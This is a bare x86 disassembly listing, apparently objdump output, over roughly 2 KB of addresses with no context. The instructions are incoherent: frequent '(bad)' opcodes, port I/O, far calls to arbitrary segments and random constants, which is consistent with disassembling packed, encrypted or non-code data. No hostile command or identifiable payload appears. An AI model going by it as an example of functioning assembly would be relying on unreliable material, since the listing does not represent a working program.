  402ff5:	rcl    DWORD PTR [ecx-0x7],0x47
  402ff9:	dec    edi
  402ffa:	dec    esi
  402ffb:	call   0xcd9b:0x6a6460d5
  403002:	mov    esp,0x9e32f472
  403007:	or     dh,cl
  403009:	inc    ebx
  40300a:	lods   al,BYTE PTR ds:[esi]
  40300b:	icebp  
  40300c:	xchg   ebp,edx
  40300e:	adc    BYTE PTR ds:0x6fa800df,bl
  403014:	cmp    DWORD PTR [ebx+esi*4-0x51271270],edx
  40301b:	daa    
  40301c:	test   DWORD PTR ds:0x8b8fa982,edx
  403022:	(bad)  
  403023:	mov    ebp,0xee7bef71
  403028:	xlat   BYTE PTR ds:[ebx]
  403029:	fdivr  st,st(6)
  40302b:	dec    edi
  40302c:	mov    ah,0xf5
  40302e:	jp     0x403008
  403030:	iret   
  403031:	inc    ecx
  403032:	xchg   esp,eax
  403033:	sbb    eax,0x545b7f4
  403038:	xlat   BYTE PTR ds:[ebx]
  403039:	inc    esp
  40303a:	adc    eax,DWORD PTR [eax-0x62e36e9c]
  403040:	lods   al,BYTE PTR ds:[esi]
  403041:	aad    0x7d
  403043:	repz xor esi,ebp
  403046:	mov    DWORD PTR [edx+edx*8],edi
  403049:	mov    ebp,0xc1602e84
  40304e:	or     ebp,DWORD PTR [ecx+0x55beb2f9]
  403054:	fwait
  403055:	aas    
  403056:	xchg   ecx,eax
  403057:	je     0x4030c9
  403059:	inc    eax
  40305a:	test   BYTE PTR [ebx+0x42],ch
  40305d:	push   es
  40305e:	(bad)  
  40305f:	in     al,0x49
  403061:	lds    ebp,FWORD PTR [esi-0x72]
  403064:	into   
  403065:	aas    
  403066:	pop    ss
  403067:	popa   
  403068:	push   ds
  403069:	mov    edx,0xab28bb8c
  40306e:	push   edx
  40306f:	outs   dx,BYTE PTR ds:[esi]
  403070:	or     DWORD PTR [esi+eax*1],edx
  403073:	iret   
  403074:	int    0x89
  403076:	bound  eax,QWORD PTR [esi+edx*8]
  403079:	retf   0x72f0
  40307c:	repnz mov al,ds:0xa72e1898
  403082:	scas   eax,DWORD PTR es:[edi]
  403083:	in     al,0xdc
  403085:	ror    DWORD PTR [edx],cl
  403087:	loope  0x403077
  403089:	add    BYTE PTR [edx+0x7298ee84],dh
  40308f:	mov    al,ds:0x60e3a5d
  403094:	jp     0x4030b1
  403096:	sbb    al,0xcd
  403098:	sbb    eax,0xb7990760
  40309d:	aaa    
  40309e:	jo     0x40305d
  4030a0:	jns    0x40309a
  4030a2:	fisttp WORD PTR [ebx-0x7f]
  4030a5:	push   edx
  4030a6:	int3   
  4030a7:	fs cld 
  4030a9:	enter  0xaa36,0x88
  4030ad:	mov    esp,0x60baa181
  4030b2:	dec    eax
  4030b3:	xchg   edi,eax
  4030b4:	fisttp WORD PTR [esi]
  4030b6:	or     eax,DWORD PTR [eax-0x22]
  4030b9:	loope  0x403069
  4030bb:	dec    edx
  4030bc:	or     bl,ch
  4030be:	in     eax,dx
  4030bf:	inc    edx
  4030c0:	inc    esi
  4030c1:	out    0xa7,eax
  4030c3:	(bad)  
  4030c4:	inc    BYTE PTR [edi-0x6a93e54a]
  4030ca:	ins    BYTE PTR es:[edi],dx
  4030cb:	jns    0x403071
  4030cd:	push   edi
  4030ce:	mov    ecx,DWORD PTR [edi]
  4030d0:	push   ds
  4030d1:	cmp    al,0x28
  4030d3:	mov    eax,ds:0x3b2887ed
  4030d8:	mov    ebp,0xebcd0a96
  4030dd:	pop    ds
  4030de:	mov    ds:0xc111911d,eax
  4030e3:	dec    esp
  4030e4:	mov    esi,0x6fa8660
  4030e9:	ds in  eax,0x58
  4030ec:	push   0x70
  4030ee:	inc    edi
  4030ef:	or     BYTE PTR [eax+0x4e],cl
  4030f2:	or     eax,0xe10a9896
  4030f8:	cmp    BYTE PTR [edx],0xe2
  4030fb:	add    esp,DWORD PTR [ebx-0x404562b8]
  403101:	in     al,0x3c
  403103:	ret    
  403104:	jg     0x403156
  403106:	aas    
  403107:	push   edx
  403108:	mov    ds:0xa4143d34,eax
  40310d:	imul   esp,eax,0xffffffc0
  403110:	push   esp
  403111:	fcmovu st,st(1)
  403113:	repz mov al,ds:0x99040ae3
  403119:	adc    dl,BYTE PTR [ebx-0x5b51822d]
  40311f:	xor    ecx,DWORD PTR [edi]
  403121:	cmp    ebx,DWORD PTR [esi+eax*2-0x7a32e98d]
  403128:	inc    DWORD PTR [ebp-0x3038004d]
  40312e:	mov    ah,0x8c
  403130:	sbb    bh,al
  403132:	xchg   esp,eax
  403133:	jmp    0x403144
  403135:	sar    BYTE PTR [eax],0x1d
  403138:	sub    bl,BYTE PTR [ebx+0xb8a1978]
  40313e:	or     al,0x39
  403140:	jecxz  0x403134
  403142:	xor    ch,BYTE PTR [ecx-0x4e]
  403145:	int3   
  403146:	les    edx,FWORD PTR [edi+0x76f22d39]
  40314c:	xchg   ebx,eax
  40314d:	inc    ebx
  40314e:	cwd    
  403150:	or     eax,0x77d21807
  403155:	pop    edi
  403156:	or     ebp,DWORD PTR [ebp+0x589bcde]
  40315c:	pop    DWORD PTR fs:[eax-0x65953d46]
  403163:	xchg   edi,eax
  403164:	xchg   BYTE PTR gs:[ecx],ch
  403167:	aaa    
  403168:	sahf   
  403169:	outs   dx,BYTE PTR ds:[esi]
  40316a:	jns    0x403101
  40316c:	and    DWORD PTR [eax],0x59
  40316f:	mov    ah,0x64
  403171:	dec    esi
  403172:	aas    
  403173:	or     eax,0xb4ed31e4
  403178:	out    dx,al
  403179:	mov    ds:0x6674f85d,eax
  40317e:	jns    0x403180
  403180:	in     al,0x72
  403182:	out    dx,eax
  403183:	add    bl,cl
  403185:	jg     0x40314c
  403187:	push   ebp
  403188:	mov    al,ds:0x20ed0165
  40318d:	xchg   DWORD PTR [edi-0x33b5c1a6],eax
  403193:	adc    DWORD PTR [ebx+ebp*4],esi
  403196:	fs push ebp
  403198:	cdq    
  403199:	or     dl,BYTE PTR [ecx]
  40319b:	loop   0x403121
  40319d:	cmp    ebx,esi
  40319f:	pop    edx
  4031a0:	mov    al,ds:0xd61e9dce
  4031a5:	xchg   esi,eax
  4031a6:	repz es iret 
  4031a9:	data16 xchg BYTE PTR [ecx+0x20],al
  4031ad:	lea    ecx,[esp+ebx*2+0xe]
  4031b1:	mov    edx,gs
  4031b3:	test   al,0x6b
  4031b5:	sbb    bl,BYTE PTR [eiz*4+0x39df844b]
  4031bc:	push   esi
  4031bd:	ins    BYTE PTR es:[edi],dx
  4031be:	jp     0x4031e7
  4031c0:	(bad)  
  4031c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031c2:	push   esi
  4031c3:	repz cmp al,0x84
  4031c6:	inc    BYTE PTR [esi+0x74d43834]
  4031cc:	fs dec eax
  4031ce:	cli    
  4031cf:	push   ds
  4031d0:	dec    eax
  4031d1:	aas    
  4031d2:	stos   DWORD PTR es:[edi],eax
  4031d3:	iret   
  4031d4:	sbb    BYTE PTR ss:[esi],bh
  4031d7:	bswap  ecx
  4031d9:	or     ebx,DWORD PTR [esi]
  4031db:	arpl   WORD PTR [eax],di
  4031dd:	(bad)  
  4031de:	std    
  4031df:	inc    esi
  4031e0:	fidivr DWORD PTR [ebp+0x1f]
  4031e3:	and    eax,0x6f643d86
  4031e8:	jns    0x4031f1
  4031ea:	inc    edx
  4031eb:	adc    eax,0x39f0846d
  4031f0:	xor    DWORD PTR ds:0xa5912a7d,0xffffffbb
  4031f7:	xchg   edi,eax
  4031f8:	rcr    ecx,0x7
  4031fb:	test   BYTE PTR [ebp+0x18],bl
  4031fe:	dec    ecx
  4031ff:	pop    esp
  403200:	or     esi,edx
  403202:	pop    edi
  403203:	sub    al,0xa3
  403205:	jns    0x4031ef
  403207:	mov    esi,0xbde1a2b1
  40320c:	int    0x12
  40320e:	addr16 dec ebp
  403210:	xchg   esi,eax
  403211:	cmp    BYTE PTR [ecx-0x1b],al
  403214:	push   cs
  403215:	mov    cl,0xe1
  403217:	mov    esi,0xa58bd04b
  40321c:	push   ds
  40321d:	xor    DWORD PTR [edi+0x54],ebx
  403220:	push   cs
  403221:	adc    esp,edx
  403223:	pushf  
  403224:	dec    eax
  403225:	hlt    
  403226:	adc    al,bh
  403228:	ins    BYTE PTR es:[edi],dx
  403229:	int    0xe2
  40322b:	ret    
  40322c:	adc    eax,0xcdf47e83
  403231:	xor    al,0x88
  403233:	icebp  
  403234:	data16 stc 
  403236:	call   0x3f088f25
  40323b:	lods   eax,DWORD PTR ds:[esi]
  40323c:	jp     0x40326a
  40323e:	cwde   
  40323f:	jne    0x4031e5
  403241:	shl    esp,cl
  403243:	and    BYTE PTR [edi],al
  403245:	jmp    0x4031cd
  403247:	nop
  403248:	cmp    bl,ch
  40324a:	adc    ch,BYTE PTR [ecx+edx*2+0xc]
  40324e:	xor    eax,0x66f691be
  403253:	ret    0x6ec3
  403256:	xchg   ebp,eax
  403257:	xrelease mov DWORD PTR [edi-0x4b],ebx
  40325b:	mov    ebx,0x94db40c5
  403260:	(bad)  
  403261:	ror    DWORD PTR [eax-0x775d02a8],cl
  403267:	imul   ecx,DWORD PTR ds:0xaee603a3,0xffffffb0
  40326e:	xor    DWORD PTR [esi-0x3bfe5e89],esi
  403274:	ret    
  403275:	test   eax,0x16b1afb6
  40327a:	dec    edx
  40327b:	mov    ah,0xe9
  40327d:	mov    al,0xab
  40327f:	ror    BYTE PTR [ebx],0x2c
  403282:	pop    esi
  403283:	jg     0x4032d6
  403285:	xchg   esi,eax
  403286:	cld    
  403287:	nop
  403288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403289:	xchg   cl,dl
  40328b:	push   cs
  40328c:	aad    0xf3
  40328e:	imul   eax,DWORD PTR [edx+0x2040f992],0x98cfdcf
  403298:	adc    ebx,DWORD PTR [edi-0x2fd9dc26]
  40329e:	inc    esp
  40329f:	mov    ecx,0x2c47f4d0
  4032a4:	mov    DWORD PTR [esi-0x591c0e0c],edx
  4032aa:	nop
  4032ab:	xor    al,0xfe
  4032ad:	idiv   DWORD PTR [ebx+ebx*1-0x34]
  4032b1:	fwait
  4032b2:	outs   dx,DWORD PTR gs:[esi]
  4032b4:	adc    edx,DWORD PTR [esi+0x4b049131]
  4032ba:	sbb    DWORD PTR [ebx-0x3],esp
  4032bd:	add    al,0x4a
  4032bf:	ret    0x6188
  4032c2:	scas   eax,DWORD PTR es:[edi]
  4032c3:	(bad)  
  4032c5:	pusha  
  4032c6:	dec    edi
  4032c7:	xlat   BYTE PTR ds:[ebx]
  4032c8:	push   edi
  4032c9:	pusha  
  4032ca:	mov    ds,WORD PTR [esi-0x24]
  4032cd:	push   esp
  4032ce:	addr16 sbb edx,esp
  4032d1:	call   0x145a:0x3dbc33fd
  4032d8:	bnd jbe 0x4032ae
  4032db:	push   0x9d649da7
  4032e0:	shl    DWORD PTR [esi-0xc],cl
  4032e3:	mov    BYTE PTR [ebp+edx*8-0x39],al
  4032e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e8:	pop    ecx
  4032e9:	jp     0x4032ab
  4032eb:	add    al,0xaf
  4032ed:	cmp    esi,DWORD PTR [ecx]
  4032ef:	dec    ecx
  4032f0:	add    bh,BYTE PTR [ebx+0x4f]
  4032f3:	stos   DWORD PTR es:[edi],eax
  4032f4:	bound  edi,QWORD PTR [ebx]
  4032f6:	call   0x89c0:0xecee9407
  4032fd:	mov    WORD PTR [ecx+edx*8],cs
  403300:	dec    edi
  403301:	adc    DWORD PTR [edx],eax
  403303:	dec    ebp
  403304:	jmp    0xd41d4ae6
  403309:	jo     0x4032aa
  40330b:	adc    al,0xc4
  40330d:	hlt    
  40330e:	in     eax,0xd3
  403310:	in     eax,dx
  403311:	push   es
  403312:	clc    
  403313:	mov    BYTE PTR ds:0xf2f89a34,ch
  403319:	repnz inc ebp
  40331b:	push   ebx
  40331c:	jmp    0xf4b0:0xeb0ece80
  403323:	jbe    0x403363
  403325:	mov    dl,0xac
  403327:	jmp    0x4032f4
  403329:	fsub   QWORD PTR [eax+0x5d370c3e]
  40332f:	iret   
  403330:	cmp    eax,0x59d67189
  403335:	dec    esp
  403336:	add    eax,0x42cb526f
  40333b:	call   0x5e83:0x3324d9a6
  403342:	mov    DWORD PTR ds:0x8df4403,esp
  403348:	sar    edx,1
  40334a:	mov    esp,DWORD PTR [eax+0x333e1244]
  403350:	imul   eax,DWORD PTR [edx],0xffffff9c
  403353:	loop   0x4032f7
  403355:	pop    ds
  403356:	sbb    edi,ebx
  403358:	cmp    DWORD PTR [ecx],esp
  40335a:	repz bound edi,QWORD PTR [esp+ebx*4+0x6057310]
  403362:	mov    ss,WORD PTR [ebp+esi*1-0x1]
  403366:	dec    esi
  403367:	sub    eax,0x5f52e99c
  40336c:	imul   eax,DWORD PTR [edi],0x5d4eb611
  403372:	mov    esi,0x5b9de013
  403377:	or     eax,0xacf91f1d
  40337c:	dec    eax
  40337d:	cmp    al,0x8f
  40337f:	call   0x16db037b
  403384:	cwde   
  403385:	and    eax,0xecabcbec
  40338a:	sub    eax,0xfb38d28f
  40338f:	es mov esp,0xe1b76daa
  403395:	cld    
  403396:	cwde   
  403397:	pop    es
  403398:	bound  edi,QWORD PTR [ecx+0x2464e86a]
  40339e:	adc    ecx,DWORD PTR [eax+0x3c9c86db]
  4033a4:	adc    eax,0xc5926b2
  4033a9:	sti    
  4033aa:	cli    
  4033ab:	fadd   QWORD PTR [edi-0x62]
  4033ae:	adc    BYTE PTR [ecx-0x127f353],0x4f
  4033b5:	dec    ebx
  4033b6:	push   ds
  4033b7:	sbb    dh,ch
  4033b9:	into   
  4033ba:	ss push ds
  4033bc:	dec    ecx
  4033bd:	mov    esp,0x33c335ad
  4033c2:	pop    ecx
  4033c3:	outs   dx,BYTE PTR ds:[esi]
  4033c4:	sub    al,0xaf
  4033c6:	ret    0x9fba
  4033c9:	lods   eax,DWORD PTR ds:[esi]
  4033ca:	pusha  
  4033cb:	mov    esi,0x57b1002a
  4033d0:	and    ebx,DWORD PTR [ecx]
  4033d2:	push   edi
  4033d3:	pop    esi
  4033d4:	inc    esp
  4033d5:	rcr    DWORD PTR [ebp-0x66f89e8e],cl
  4033db:	cli    
  4033dc:	mov    dh,0xfb
  4033de:	mov    dh,BYTE PTR [ebx-0x631ee864]
  4033e4:	cmp    ebp,ecx
  4033e6:	data16 jb 0x4033ec
  4033e9:	adc    al,0x77
  4033eb:	nop
  4033ec:	cvtps2pd xmm2,QWORD PTR [eax+0x21]
  4033f0:	(bad)  
  4033f1:	out    dx,al
  4033f2:	(bad)  
  4033f3:	repnz push eax
  4033f5:	jnp    0x403402
  4033f7:	mov    dh,0xfa
  4033f9:	fcmove st,st(0)
  4033fb:	mov    eax,ds:0xf602357d
  403400:	mov    bh,0xa1
  403402:	xchg   dl,al
  403404:	fwait
  403405:	ss pushf 
  403407:	jne    0x40340a
  403409:	adc    eax,0x1c6b25b3
  40340e:	sar    BYTE PTR [ecx+0x25],0xdf
  403412:	scas   al,BYTE PTR es:[edi]
  403413:	jnp    0x403431
  403415:	popf   
  403416:	lods   al,BYTE PTR ds:[esi]
  403417:	add    BYTE PTR [edi],ah
  403419:	or     ch,dh
  40341b:	repnz (bad) 
  40341d:	adc    DWORD PTR [esi],edi
  40341f:	jae    0x403427
  403421:	xor    ecx,DWORD PTR [eax]
  403423:	je     0x4033bc
  403425:	test   BYTE PTR [edi+0x46],ah
  403428:	shr    al,1
  40342a:	out    0x9f,eax
  40342c:	leave  
  40342d:	mov    cl,0x35
  40342f:	test   esp,ecx
  403431:	inc    ecx
  403432:	push   esp
  403434:	mov    edi,DWORD PTR [eax]
  403436:	js     0x403475
  403438:	dec    ecx
  403439:	xor    eax,DWORD PTR [esi+0x39d18fe6]
  40343f:	out    dx,eax
  403440:	push   ss
  403441:	sahf   
  403442:	nop
  403443:	daa    
  403444:	xlat   BYTE PTR ds:[ebx]
  403445:	xchg   cl,dl
  403447:	pop    es
  403448:	cli    
  403449:	mov    DWORD PTR [ecx],edx
  40344b:	test   al,0xfc
  40344d:	jl     0x4034a6
  40344f:	mov    BYTE PTR [esi-0x7d3ad60c],0x5d
  403456:	lods   al,BYTE PTR ds:[esi]
  403457:	adc    al,0x86
  403459:	gs xor ebx,0xdbc19ee5
  403460:	inc    edx
  403461:	mov    ch,0x96
  403463:	aam    0xe5
  403465:	jle    0x40347e
  403467:	dec    esi
  403468:	mov    ah,0xba
  40346a:	push   cs
  40346b:	lods   eax,DWORD PTR ds:[esi]
  40346c:	sbb    esp,DWORD PTR [ebx-0x51]
  40346f:	popa   
  403470:	ds dec edi
  403472:	xlat   BYTE PTR ds:[ebx]
  403473:	sub    BYTE PTR [eax],dl
  403475:	fistp  WORD PTR [eax]
  403477:	ret    0x6f9b
  40347a:	ds repnz pop ebp
  40347d:	inc    edx
  40347e:	enter  0xaa1e,0xc5
  403482:	shl    BYTE PTR [edi],cl
  403484:	sbb    BYTE PTR [ebp-0x4093cfc0],0x44
  40348b:	mov    ds:0xd09fa530,al
  403490:	push   esp
  403491:	enter  0x1adf,0x8d
  403495:	int    0x30
  403497:	lods   al,BYTE PTR ds:[esi]
  403498:	sti    
  403499:	into   
  40349a:	aad    0xc7
  40349c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40349d:	cmc    
  40349e:	nop
  40349f:	inc    eax
  4034a0:	add    BYTE PTR [esi-0x2f2222d0],al
  4034a6:	leave  
  4034a7:	adc    esi,0xffffffaa
  4034aa:	aas    
  4034ab:	mov    ecx,0xd762ab63
  4034b0:	aam    0x17
  4034b2:	mov    eax,ds:0xc47f0b81
  4034b7:	cli    
  4034b8:	inc    esi
  4034b9:	dec    ebx
  4034ba:	push   es
  4034bb:	push   es
  4034bc:	sti    
  4034bd:	pop    esp
  4034be:	bound  esi,QWORD PTR [edi]
  4034c0:	out    dx,al
  4034c1:	ret    0xb7f5
  4034c4:	xlat   BYTE PTR ds:[ebx]
  4034c5:	jl     0x403521
  4034c7:	mov    dh,0x1a
  4034c9:	enter  0xdb1c,0xbb
  4034cd:	inc    esp
  4034ce:	daa    
  4034cf:	hlt    
  4034d0:	mov    dh,0xb0
  4034d2:	and    al,0x9c
  4034d4:	sbb    BYTE PTR [edi-0x45bd1099],dl
  4034da:	jmp    0xf957b2a2
  4034df:	jle    0x40351d
  4034e1:	jno    0x4034ac
  4034e3:	mov    dh,0x6a
  4034e5:	add    BYTE PTR [eax+eiz*8-0x48],ah
  4034e9:	cmp    eax,0x839ad44e
  4034ee:	add    eax,0x7c6baf19
  4034f3:	fist   WORD PTR [ebx-0x4a02a836]
  4034f9:	xchg   BYTE PTR [edx+0x656d5212],dl
  4034ff:	or     al,0x7d
  403501:	es dec ecx
  403503:	dec    edx
  403504:	xchg   edx,eax
  403505:	out    dx,al
  403506:	mov    ds:0x99e1f890,al
  40350b:	sub    DWORD PTR [ecx+0x64],0xffffffa1
  40350f:	push   es
  403510:	mov    ebp,0x62f02a4c
  403515:	push   ebp
  403516:	xor    eax,DWORD PTR [esi]
  403518:	sub    edi,DWORD PTR [esp+ebp*8]
  40351b:	repnz push edx
  40351d:	mov    ebp,ds
  40351f:	dec    ebp
  403520:	fidiv  WORD PTR [ecx]
  403522:	pop    ecx
  403523:	add    al,0x6
  403525:	adc    DWORD PTR [edi-0x4c],eax
  403528:	and    ebp,edx
  40352a:	into   
  40352b:	hlt    
  40352c:	das    
  40352d:	jmp    0x4034fd
  40352f:	mov    ds,WORD PTR [eax-0x7]
  403532:	pop    ss
  403533:	fild   QWORD PTR [ebx]
  403535:	mov    ds:0x8cead2fd,eax
  40353a:	xchg   ecx,eax
  40353b:	adc    al,BYTE PTR [edi+0x1d]
  40353e:	(bad)  
  403540:	and    eax,0x1bf7e9ca
  403545:	cli    
  403546:	push   ecx
  403547:	sti    
  403548:	xor    al,0xa6
  40354a:	lods   al,BYTE PTR ds:[esi]
  40354b:	lods   eax,DWORD PTR ds:[esi]
  40354c:	ror    ecx,1
  40354e:	xchg   BYTE PTR [edi+0x52568064],ch
  403554:	or     eax,0x5b6966e1
  403559:	rol    DWORD PTR [ebx+edi*4],1
  40355c:	lea    esi,[ecx]
  40355e:	jnp    0x4035a8
  403560:	mov    ebx,0xd6827f89
  403565:	mov    dh,0x71
  403567:	xor    ebp,ecx
  403569:	ficomp DWORD PTR [edx]
  40356b:	jp     0x4035d3
  40356d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40356e:	outs   dx,DWORD PTR ds:[esi]
  40356f:	popa   
  403570:	mov    ch,BYTE PTR [esi+0x3b633766]
  403576:	xchg   edi,eax
  403577:	jmp    0xca73:0xcae258d6
  40357e:	adc    ch,BYTE PTR [ecx]
  403580:	in     eax,dx
  403581:	xor    BYTE PTR [eax+0x74032351],al
  403587:	pop    edi
  403588:	xchg   DWORD PTR [edi-0xa463f2f],ebp
  40358e:	push   es
  40358f:	xor    eax,0x333b92ff
  403594:	xchg   esp,eax
  403595:	retf   0x84bf
  403598:	mov    ecx,0x1302d945
  40359d:	call   0x6e59:0xfe8eb10d
  4035a4:	xchg   esp,eax
  4035a5:	rol    ch,cl
  4035a7:	in     eax,dx
  4035a8:	sbb    al,0x2f
  4035aa:	nop
  4035ab:	jmp    0x180f20bf
  4035b0:	sbb    BYTE PTR [ebx],0xca
  4035b3:	pop    edi
  4035b4:	adc    DWORD PTR [ecx],edx
  4035b6:	cmp    DWORD PTR [edi-0x5ec00272],0x5d
  4035bd:	or     bh,BYTE PTR [edx+0x71]
  4035c0:	xor    eax,0xaac47b22
  4035c5:	cs stc 
  4035c7:	test   al,0x24
  4035c9:	pop    edx
  4035ca:	jl     0x40361d
  4035cc:	add    ah,BYTE PTR [edx+eax*4+0x1d986b1f]
  4035d3:	push   edi
  4035d4:	pop    esi
  4035d5:	ja     0x403629
  4035d7:	sub    al,0xb6
  4035d9:	ret    0x237b
  4035dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035dd:	imul   ecx,DWORD PTR [esi],0xffffffab
  4035e0:	dec    edx
  4035e1:	maxps  xmm1,XMMWORD PTR [esi+0x49073da2]
  4035e8:	int    0xee
  4035ea:	icebp  
  4035eb:	sbb    esp,DWORD PTR [esi]
  4035ed:	or     ch,dh
  4035ef:	adc    DWORD PTR [edx],esi
  4035f1:	mov    fs,WORD PTR [edx+0x6d]
  4035f4:	das    
  4035f5:	out    dx,al
  4035f6:	cdq    
  4035f7:	or     cl,dh
  4035f9:	inc    eax
  4035fa:	sub    BYTE PTR [edi],bl
  4035fc:	rol    BYTE PTR [ebp-0x2f2bc6fa],0xc6
  403603:	add    esp,DWORD PTR [ebx+0x161ce0e7]
  403609:	ins    DWORD PTR es:[edi],dx
  40360a:	and    BYTE PTR [ebx+0x15],ch
  40360d:	mov    ch,0x6b
  40360f:	mov    edx,0xc785ed53
  403614:	out    dx,eax
  403615:	pop    edi
  403616:	push   esp
  403617:	pop    ds
  403618:	pop    ebx
  403619:	repz cli 
  40361b:	scas   eax,DWORD PTR es:[edi]
  40361c:	jp     0x403649
  40361e:	dec    esp
  40361f:	inc    ebx
  403620:	test   al,0x71
  403622:	mov    ah,0x8d
  403624:	lahf   
  403625:	jmp    0x9e68:0xa1f88c48
  40362c:	cmp    bl,bl
  40362e:	jmp    0x145279b4
  403633:	adc    dl,bh
  403635:	icebp  
  403636:	pop    ebp
  403637:	std    
  403638:	fmul   st,st(2)
  40363a:	jp     0x4035ee
  40363c:	popa   
  40363d:	mov    ebx,0xbc7d7e3d
  403642:	clc    
  403643:	int    0xe7
  403645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403646:	loope  0x4035db
  403648:	or     esi,DWORD PTR [ecx-0x697d140f]
  40364e:	and    DWORD PTR fs:[ebx+0x79],eax
  403652:	das    
  403653:	test   BYTE PTR [esi],ch
  403655:	sar    DWORD PTR [ebp-0x16c7824a],cl
  40365b:	or     al,0x6c
  40365d:	ja     0x4036c1
  40365f:	sub    eax,0x38bfd379
  403664:	ror    edx,0xe
  403667:	mov    ecx,0x5d0cc3af
  40366c:	arpl   WORD PTR [ebp+ecx*2-0x5c94f8d3],dx
  403673:	dec    ebp
  403674:	dec    edi
  403675:	pop    ss
  403676:	adc    DWORD PTR [edi-0x740b0a16],ebx
  40367c:	addr16 jge 0x4036cf
  40367f:	push   ss
  403680:	push   ebp
  403681:	adc    edx,edx
  403683:	jl     0x40362a
  403685:	push   edx
  403686:	jo     0x4036fd
  403688:	ds pop ss
  40368a:	in     eax,dx
  40368b:	cdq    
  40368c:	sbb    DWORD PTR [edi+eax*1-0x3d],0x3cb7e5e2
  403694:	mov    al,ds:0xb35e7e62
  403699:	jle    0x4036c8
  40369b:	xlat   BYTE PTR ds:[ebx]
  40369c:	jns    0x403661
  40369e:	bound  edi,QWORD PTR [esi]
  4036a0:	xchg   DWORD PTR [ebp+0xb6628bc],eax
  4036a6:	mov    ecx,0x2b4d56cf
  4036ab:	cmp    dl,ch
  4036ad:	shr    BYTE PTR [ecx],0xb5
  4036b0:	and    DWORD PTR [ecx-0x6b],edi
  4036b3:	cmp    DWORD PTR [edx-0x1c],ecx
  4036b6:	in     eax,0xff
  4036b8:	scas   al,BYTE PTR es:[edi]
  4036b9:	dec    ebp
  4036ba:	icebp  
  4036bb:	out    dx,eax
  4036bc:	clc    
  4036bd:	xchg   esp,eax
  4036be:	xchg   ebp,eax
  4036bf:	pop    esp
  4036c0:	add    dh,bh
  4036c2:	adc    BYTE PTR [ebx+0x7b07b0c7],bl
  4036c8:	test   BYTE PTR ds:0xc65476d7,ah
  4036ce:	cmp    esi,DWORD PTR [ecx+0x42c7f8f8]
  4036d4:	(bad)
  4036d7:	xor    DWORD PTR [ecx-0x14],eax
  4036da:	sbb    DWORD PTR [ebx+0x42c1bd8e],0xffffffff
  4036e1:	or     eax,0xe027538c
  4036e6:	fwait
  4036e7:	adc    BYTE PTR [edi+0xceb0562],dh
  4036ed:	xor    eax,0x5475ae29
  4036f2:	loopne 0x4036a0
  4036f4:	xchg   esp,eax
  4036f5:	push   edi
  4036f6:	pushf  
  4036f7:	mov    edx,0x88b430f
  4036fc:	inc    edx
  4036fd:	xchg   ebp,eax
  4036fe:	ins    DWORD PTR es:[edi],dx
  4036ff:	jge    0x4036a2
  403701:	movlps QWORD PTR ds:0xf38f5395,xmm3
  403708:	das    
  403709:	test   al,0x5e
  40370b:	add    esp,edx
  40370d:	fild   QWORD PTR [ecx]
  40370f:	and    BYTE PTR [ebp-0x67],ch
  403712:	cmp    edx,DWORD PTR [ebp-0x32a0a84a]
  403718:	and    cl,BYTE PTR [edx]
  40371a:	mov    ebx,0xe7bb8ee9
  40371f:	imul   eax,eax,0xf
  403722:	(bad)  
  403723:	or     al,0x40
  403725:	jns    0x4036f8
  403727:	cmp    esi,DWORD PTR [esi+0x4b]
  40372a:	test   DWORD PTR [ebp+0x24793ff9],edx
  403730:	add    BYTE PTR [ebp-0x324c617b],cl
  403736:	mov    DWORD PTR [ecx+0x28c46845],ebp
  40373c:	push   esp
  40373d:	(bad)  
  40373e:	imul   BYTE PTR [esp+ebx*4+0x19ceb240]
  403745:	push   esp
  403746:	xchg   ebx,eax
  403747:	sbb    al,0x8b
  403749:	or     ecx,DWORD PTR [ebx+0x41]
  40374c:	test   BYTE PTR [esi],bh
  40374e:	or     ebx,DWORD PTR [edx+0x1e]
  403751:	aam    0xc6
  403753:	jmp    0x5547:0x60363533
  40375a:	xchg   DWORD PTR [edi+0x7],ecx
  40375d:	and    esp,ebp
  40375f:	or     ah,BYTE PTR [esi+ebp*1-0x6a]
  403763:	into   
  403764:	jno    0x4037dc
  403766:	pop    eax
  403767:	aas    
  403768:	mov    edi,0xc0b95a46
  40376d:	cmp    esp,eax
  40376f:	imul   ecx,DWORD PTR [esi-0x521c626a],0xdb3a6858
  403779:	jo     0x4037dd
  40377b:	fistp  QWORD PTR [edi]
  40377d:	push   0x6d39016f
  403782:	mov    ch,0x84
  403784:	xor    al,0x9d
  403786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403787:	lods   eax,DWORD PTR ds:[esi]
  403788:	mov    eax,ebx
  40378a:	sub    eax,0xbc251acd
  40378f:	mov    ds:0x4e9df55c,eax
  403794:	f2xm1  
  403796:	sahf   
  403797:	pop    ds
  403798:	outs   dx,BYTE PTR ds:[esi]
  403799:	and    BYTE PTR [edi+0x1523ea03],ah
  40379f:	jle    0x403759
  4037a1:	out    0x8a,al
  4037a3:	mov    bl,0x48
  4037a5:	pusha  
  4037a6:	and    dh,bl
  4037a8:	pop    esp
  4037a9:	or     al,0x2a
  4037ab:	push   eax
  4037ac:	mov    bl,0xbf
  4037ae:	aad    0xec
  4037b0:	or     BYTE PTR [ecx-0x4d],ch
  4037b3:	and    al,0x50
  4037b5:	das    
  4037b6:	retf   0xace0
  4037b9:	loop   0x403819
  4037bb:	fmul   QWORD PTR [esi+0x22]
  4037be:	or     ch,ah
  4037c0:	out    0x8f,al
  4037c2:	push   esi
  4037c3:	in     eax,dx
  4037c4:	push   ss
  4037c5:	inc    eax
  4037c6:	stos   DWORD PTR es:[edi],eax
  4037c7:	les    ebp,FWORD PTR [eax-0x34]
  4037ca:	adc    al,0x6d
  4037cc:	mov    ebp,0x43c7129d
  4037d1:	jle    0x4037e7
  4037d3:	dec    edi
  4037d4:	adc    DWORD PTR [edx],edi
  4037d6:	cmp    esp,DWORD PTR [ecx-0x1f55711e]
  4037dc:	(bad)  
  4037dd:	imul   DWORD PTR [ebp+edx*1-0x5e]
  4037e1:	mov    bh,0xc4
  4037e3:	inc    ebx
  4037e4:	jae    0x4037d4
  4037e6:	mov    al,ds:0x7880b584
  4037eb:	add    edx,DWORD PTR [ebx]
